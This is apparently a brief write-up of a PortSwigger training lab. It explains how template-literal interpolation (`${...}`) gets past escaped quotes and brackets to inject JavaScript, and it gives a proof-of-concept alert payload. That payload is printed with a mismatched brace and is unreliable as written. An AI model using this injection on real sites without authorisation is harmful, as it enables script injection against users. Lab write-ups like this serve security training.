Link: [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
Difficulty: Practitioner

# Definition 
What is template literals ?
They are literals delimited with backtick (`) characters, allowing for multi-line strings, string interpolation with embeedded expressions, and special constructs called tagged templates
```
`string text ${expression} string text`
```

Therefore, The expression `${}` may help to escape the javascript string, even though all the special characters being blocked. 
As I can see in the page source, the input is being put in the (`) backticks. Then, by using the expression `${}` it would turn out to be like this
```
<script>
...
var input = `controllable data here ${}`;
...
</script>
```
# Action
Time to craft the payload
```
${alert{document.domain)}
```

Happy Hacking!@#!#@
